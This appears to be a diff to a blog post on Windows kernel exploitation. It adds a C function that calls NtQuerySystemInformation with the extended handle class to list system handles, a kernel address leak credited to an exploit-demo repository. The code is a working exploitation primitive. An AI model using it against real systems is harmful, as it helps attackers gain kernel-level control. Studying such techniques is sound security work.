@@ -135,3 +135,63 @@ VOID findMemoryWindows(){
 
 }
 {% endhighlight %}
+
+### BOOL getHandles(PSYSTEM_HANDLE_INFORMATION_EX* handleInfo)
+{% highlight C %}
+BOOL getHandles(PSYSTEM_HANDLE_INFORMATION_EX* handleInfo)
+{
+	// Source: https://github.com/clymb3r/KdExploitMe/blob/master/ExploitDemos/KernelAddressLeak.cpp
+
+	BOOL functionSuccess = false;
+	ULONG handleInfoSize = sizeof(SYSTEM_HANDLE_INFORMATION_EX)+(sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)* 10000);
+	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH; //Make status be an error so the loop starts.
+	*handleInfo = NULL;
+
+	HMODULE hModule = LoadLibraryW(L"ntdll.dll");
+	NtQuerySystemInformation pNtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
+	FreeLibrary(hModule);
+	if (pNtQuerySystemInformation == NULL){
+		printf("- Error: Cannot retrieve NtQuerySystemInformation address.\n");
+		goto Cleanup;
+	}
+
+	ULONG requiredSize = 0;
+	while (status == STATUS_INFO_LENGTH_MISMATCH){
+
+		if (*handleInfo){
+			free(*handleInfo);
+		}
+
+		//Allocate space for NtQuerySystemInformation and call it
+		*handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(handleInfoSize);
+		ZeroMemory(*handleInfo, handleInfoSize);
+		status = (*pNtQuerySystemInformation)((SYSTEM_INFORMATION_CLASS) 64, *handleInfo, handleInfoSize, &requiredSize);
+		//If there isn't enough space in the buffer, increase the buffer size
+		if (NT_SUCCESS(status)){
+			break;
+		}
+		else if (status == STATUS_INFO_LENGTH_MISMATCH){
+			ULONG additionalSpace = sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)* 1000;
+			if (ULONG_MAX - additionalSpace < requiredSize){
+				printf("- Error: Looping error increasing buffersize for NtQuerySystemInformation.\n");
+				goto Cleanup;
+			}
+			handleInfoSize = requiredSize + additionalSpace;
+		} else {
+			printf("- Error: Unexpected error from NtQuerySystemInformation. Error: 0x%x\n", status);
+			goto Cleanup;
+		}
+	}
+	printf("+ QueryNtHandles returning success: NtQuerySystemInformation returned %i entries.\n", (*handleInfo)->NumberOfHandles);
+	functionSuccess = true;
+
+Cleanup:
+	if (!functionSuccess){
+		if (*handleInfo){
+			free(*handleInfo);
+			*handleInfo = NULL;
+		}
+	}
+	return functionSuccess;
+}
+{% endhighlight %}
